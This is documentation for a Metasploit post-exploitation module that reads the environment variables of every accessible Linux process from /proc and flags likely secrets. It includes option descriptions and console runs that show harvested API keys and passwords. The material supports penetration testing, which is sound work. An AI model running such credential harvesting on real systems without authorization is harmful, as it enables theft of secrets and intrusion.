## Vulnerable Application

This module extracts environment variables from all accessible processes via
`/proc/<pid>/environ` on Linux and flags potential secrets using a three-layer
detection engine:

1. **Name heuristics** - matches variable names against known secret patterns
   (e.g. `API_KEY`, `PASSWORD`, `AWS_SECRET_ACCESS_KEY`)
2. **Value pattern matching** - identifies known token formats from providers
   such as GitHub, GitLab, AWS, Slack, Stripe, and others
3. **Shannon entropy analysis** - catches high-entropy values that evade the
   first two layers

Environment variables persist in `/proc/<pid>/environ` for the lifetime of
each process and are readable by any process running as the same UID or as
root. This module reads all accessible process environments in a single
command to minimize session round trips, then analyzes them locally.

Two loot files are stored:

- `linux.enum.environment` - all environment variables
- `linux.enum.env_secrets` - flagged secrets with confidence levels and PIDs

Any Linux system with a `/proc` filesystem is a valid target. No specific
vulnerable application version is required - the module reads process
environments that the session user has permission to access.

## Verification Steps

1. Start msfconsole
1. Get a session on a Linux target
1. Do: `use post/linux/gather/enum_env_secrets`
1. Do: `set SESSION <session_id>`
1. Do: `run`
1. You should see environment variables analyzed and any detected secrets reported

## Options

### PID

Scan a specific PID only. When not set, all accessible processes under `/proc`
are scanned.

### MATCH_NAME

Only scan processes matching this name (substring, case-insensitive). For
example, setting `MATCH_NAME` to `python` will only analyze processes whose
`/proc/<pid>/comm` contains "python".

### ENTROPY

Enable Shannon entropy detection for values that don't match any name or value
rule. Enabled by default. Set to `false` to disable entropy-based detection and
only report matches from name heuristics and value pattern rules.

### MIN_ENTROPY

Minimum Shannon entropy threshold in bits per character. Default is `4.5`.
Values below 16 characters are always excluded from entropy analysis. Increase
this value to reduce false positives from entropy detection; decrease to catch
shorter or lower-entropy secrets.

### MIN_CONFIDENCE

Minimum confidence level to report. Accepts `LOW`, `MED`, or `HIGH`. Default
is `LOW` (report everything). Set to `MED` to suppress entropy-only findings,
or `HIGH` to only report high-confidence matches.

## Scenarios

### Ubuntu 24.04 (x86_64) as unprivileged user

When running as a non-root user, the module can only read environments of
processes owned by the same UID:

```
msf6 > use post/linux/gather/enum_env_secrets
msf6 post(linux/gather/enum_env_secrets) > set SESSION 1
SESSION => 1
msf6 post(linux/gather/enum_env_secrets) > run

[*] Enumerating processes from /proc...
[*] Found 78 accessible process(es)
[+] All environment variables saved to /home/user/.msf4/loot/20260402113723_default_192.0.2.1_linux.enum.envir_227540.txt
[*] Analyzing environment variables...
[+] Found 103 potential secret(s)

[HIGH] [API key] [pid:35131] [client] API_KEY=16b7182de17ac0b2d232f4442f5fe55d
[HIGH] [Password] [pid:35139] [server] PASSWORD=mysecret123
[MED] [Key] [pid:2065] [snapd-desktop-i] SNAP_INSTANCE_KEY=
[MED] [Key] [pid:2372] [snapd-desktop-i] SNAP_INSTANCE_KEY=
[LOW] [High entropy value (4.67 bits)] [pid:2065] [snapd-desktop-i] GDK_PIXBUF_MODULEDIR=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders
[LOW] [High entropy value (4.53 bits)] [pid:2065] [snapd-desktop-i] GI_TYPELIB_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/girepository-1.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/girepository-1.0
[LOW] [High entropy value (4.53 bits)] [pid:2065] [snapd-desktop-i] GST_PLUGIN_PATH=/snap/snapd-desktop-integration/315/usr/lib/x86_64-linux-gnu/gstreamer-1.0
[LOW] [High entropy value (4.51 bits)] [pid:2065] [snapd-desktop-i] GST_PLUGIN_SCANNER=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-plugin-scanner
[LOW] [High entropy value (4.55 bits)] [pid:2065] [snapd-desktop-i] GST_PLUGIN_SYSTEM_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gstreamer-1.0
[LOW] [High entropy value (4.59 bits)] [pid:2065] [snapd-desktop-i] GTK_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-2.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/gtk-2.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/gtk-3.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-4.0
[LOW] [High entropy value (4.52 bits)] [pid:2065] [snapd-desktop-i] LD_LIBRARY_PATH=/var/lib/snapd/lib/gl:/var/lib/snapd/lib/gl32:/var/lib/snapd/void:/snap/snapd-desktop-integration/315/usr/lib:/snap/snapd-desktop-integration/315/usr/lib/x86_64-linux-gnu:/snap/snapd-desktop-integration/315/gnome-platform/lib/x86_64-linux-gnu:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib:/snap/snapd-desktop-integration/315/gnome-platform/lib:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/dri:/var/lib/snapd/lib/gl:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/libunity:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/pulseaudio
[LOW] [High entropy value (4.61 bits)] [pid:2065] [snapd-desktop-i] LIBGWEATHER_LOCATIONS_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/libgweather-4/Locations.bin
[LOW] [High entropy value (4.57 bits)] [pid:2065] [snapd-desktop-i] PIPEWIRE_MODULE_DIR=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/pipewire-0.3
[LOW] [High entropy value (4.99 bits)] [pid:2065] [snapd-desktop-i] SNAP_CONTEXT=AfIgF9uvSkZKpJ_gFzTQsXdK7RR2QNM9GLm905Wj_Lm9JWh0XXPP
[LOW] [High entropy value (4.99 bits)] [pid:2065] [snapd-desktop-i] SNAP_COOKIE=AfIgF9uvSkZKpJ_gFzTQsXdK7RR2QNM9GLm905Wj_Lm9JWh0XXPP
[LOW] [High entropy value (4.57 bits)] [pid:2065] [snapd-desktop-i] SPA_PLUGIN_DIR=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/spa-0.2
[LOW] [High entropy value (4.61 bits)] [pid:2300] [at-spi-bus-laun] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2301] [gnome-shell] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2314] [dbus-daemon] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.71 bits)] [pid:2365] [at-spi2-registr] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/at-spi/bus,guid=5ac81b401f5c3477f9b9aaa168fb3df6
[LOW] [High entropy value (4.61 bits)] [pid:2365] [at-spi2-registr] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.67 bits)] [pid:2372] [snapd-desktop-i] GDK_PIXBUF_MODULEDIR=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gdk-pixbuf-2.0/2.10.0/loaders
[LOW] [High entropy value (4.53 bits)] [pid:2372] [snapd-desktop-i] GI_TYPELIB_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/girepository-1.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/girepository-1.0
[LOW] [High entropy value (4.53 bits)] [pid:2372] [snapd-desktop-i] GST_PLUGIN_PATH=/snap/snapd-desktop-integration/315/usr/lib/x86_64-linux-gnu/gstreamer-1.0
[LOW] [High entropy value (4.51 bits)] [pid:2372] [snapd-desktop-i] GST_PLUGIN_SCANNER=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-plugin-scanner
[LOW] [High entropy value (4.55 bits)] [pid:2372] [snapd-desktop-i] GST_PLUGIN_SYSTEM_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gstreamer-1.0
[LOW] [High entropy value (4.59 bits)] [pid:2372] [snapd-desktop-i] GTK_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-2.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/gtk-2.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-3.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/gtk-3.0:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/gtk-4.0
[LOW] [High entropy value (4.52 bits)] [pid:2372] [snapd-desktop-i] LD_LIBRARY_PATH=/var/lib/snapd/lib/gl:/var/lib/snapd/lib/gl32:/var/lib/snapd/void:/snap/snapd-desktop-integration/315/usr/lib:/snap/snapd-desktop-integration/315/usr/lib/x86_64-linux-gnu:/snap/snapd-desktop-integration/315/gnome-platform/lib/x86_64-linux-gnu:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib:/snap/snapd-desktop-integration/315/gnome-platform/lib:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/dri:/var/lib/snapd/lib/gl:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/libunity:/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/pulseaudio
[LOW] [High entropy value (4.61 bits)] [pid:2372] [snapd-desktop-i] LIBGWEATHER_LOCATIONS_PATH=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/libgweather-4/Locations.bin
[LOW] [High entropy value (4.57 bits)] [pid:2372] [snapd-desktop-i] PIPEWIRE_MODULE_DIR=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/pipewire-0.3
[LOW] [High entropy value (4.99 bits)] [pid:2372] [snapd-desktop-i] SNAP_CONTEXT=AfIgF9uvSkZKpJ_gFzTQsXdK7RR2QNM9GLm905Wj_Lm9JWh0XXPP
[LOW] [High entropy value (4.99 bits)] [pid:2372] [snapd-desktop-i] SNAP_COOKIE=AfIgF9uvSkZKpJ_gFzTQsXdK7RR2QNM9GLm905Wj_Lm9JWh0XXPP
[LOW] [High entropy value (4.57 bits)] [pid:2372] [snapd-desktop-i] SPA_PLUGIN_DIR=/snap/snapd-desktop-integration/315/gnome-platform/usr/lib/x86_64-linux-gnu/spa-0.2
[LOW] [High entropy value (4.65 bits)] [pid:2402] [gnome-shell-cal] DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.65 bits)] [pid:2402] [gnome-shell-cal] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.61 bits)] [pid:2402] [gnome-shell-cal] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2409] [evolution-sourc] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.65 bits)] [pid:2421] [gjs] DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.65 bits)] [pid:2421] [gjs] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.61 bits)] [pid:2421] [gjs] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2423] [ibus-daemon] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2424] [gsd-a11y-settin] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2426] [gsd-color] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2430] [gsd-datetime] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2436] [gsd-housekeepin] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2440] [gsd-keyboard] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2442] [gsd-media-keys] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2443] [gsd-power] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2445] [gsd-print-notif] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2447] [gsd-rfkill] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2454] [gsd-screensaver] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2466] [gsd-sharing] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2470] [gsd-smartcard] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2471] [gsd-sound] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2472] [gsd-wacom] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2478] [evolution-alarm] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2521] [gsd-disk-utilit] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2627] [gsd-printer] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.65 bits)] [pid:2634] [goa-daemon] DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.65 bits)] [pid:2634] [goa-daemon] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.61 bits)] [pid:2634] [goa-daemon] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.65 bits)] [pid:2683] [goa-identity-se] DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.65 bits)] [pid:2683] [goa-identity-se] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.61 bits)] [pid:2683] [goa-identity-se] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2698] [ibus-dconf] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2701] [ibus-extension-] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.65 bits)] [pid:2707] [ibus-portal] DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.65 bits)] [pid:2707] [ibus-portal] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.61 bits)] [pid:2707] [ibus-portal] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2709] [gvfs-udisks2-vo] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2720] [evolution-calen] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2737] [gvfs-gphoto2-vo] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2748] [evolution-addre] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2749] [gvfs-goa-volume] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2757] [gvfs-mtp-volume] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2767] [gvfs-afc-volume] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2778] [Xwayland] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2793] [ibus-engine-sim] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2797] [dconf-service] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2847] [xdg-desktop-por] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2854] [gsd-xsettings] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.65 bits)] [pid:2887] [gjs] DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.65 bits)] [pid:2887] [gjs] DBUS_STARTER_ADDRESS=unix:path=/run/user/1000/bus,guid=457250c61a7876a4d41410e568fb3df5
[LOW] [High entropy value (4.61 bits)] [pid:2887] [gjs] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2913] [ibus-x11] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2921] [tracker-miner-f] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2922] [xdg-desktop-por] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:2923] [mutter-x11-fram] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:3025] [xdg-desktop-por] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:3036] [gvfsd-metadata] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:3884] [update-notifier] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:10390] [gnome-terminal-] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:23294] [bash] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:23971] [bash] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:31982] [ncat] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:31983] [sh] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:35060] [gjs] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.56 bits)] [pid:35105] [bash] GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/051202fb_b385_44d8_b314_c876e897d47b
[LOW] [High entropy value (4.61 bits)] [pid:35105] [bash] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.56 bits)] [pid:35131] [client] GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/051202fb_b385_44d8_b314_c876e897d47b
[LOW] [High entropy value (4.61 bits)] [pid:35131] [client] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:35132] [bash] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254
[LOW] [High entropy value (4.61 bits)] [pid:35139] [server] SESSION_MANAGER=local/ubuntu-22-04-desktop-amd64:@/tmp/.ICE-unix/2254,unix/ubuntu-22-04-desktop-amd64:/tmp/.ICE-unix/2254

[+] Results saved to /home/user/.msf4/loot/20260401103900_default_192.0.2.1_linux.enum.env_s_230237.txt
[*] Post module execution completed
```

### Filtering by confidence level

```
msf6 > use post/linux/gather/enum_env_secrets
msf6 post(linux/gather/enum_env_secrets) > set SESSION 1
SESSION => 1
msf6 post(linux/gather/enum_env_secrets) > set MIN_CONFIDENCE HIGH
MIN_CONFIDENCE => HIGH
msf6 post(linux/gather/enum_env_secrets) > run

[*] Enumerating processes from /proc...
[*] Found 78 accessible process(es)
[+] All environment variables saved to /home/user/.msf4/loot/20260401104438_default_192.0.2.1_linux.enum.envir_196158.txt
[*] Analyzing environment variables...
[+] Found 2 potential secret(s)

[HIGH] [API key] [pid:35131] [client] API_KEY=16b7182de17ac0b2d232f4442f5fe55d
[HIGH] [Password] [pid:35139] [server] PASSWORD=mysecret123

[+] Results saved to /home/user/.msf4/loot/20260401104438_default_192.0.2.1_linux.enum.env_s_544769.txt
[*] Post module execution completed
```
